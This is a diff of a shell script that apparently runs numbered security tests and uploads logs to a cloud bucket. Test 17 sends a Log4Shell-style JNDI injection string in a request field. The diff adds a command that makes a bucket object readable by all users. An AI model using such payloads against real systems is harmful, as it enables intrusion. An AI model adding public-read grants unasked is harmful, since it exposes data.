@@ -114,12 +114,15 @@ echo "start test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 curl https://10.1.1.3/?url=https://localhost&username=${jndi:ldap://${hostName}.localhost/test}
 echo "stop test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
+gcloud storage objects update gs://plat-g-data-store/stuff.txt --add-acl-grant=entity=AllUsers,role=READER
+
 #lets export out logs 
 cp log.txt /var/log/gcp.log
 gcloud storage cp /var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
 mv /var/log/gcp.log /var/log/gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt 
 
 sleep 180
+
 shutdown
 
 fi
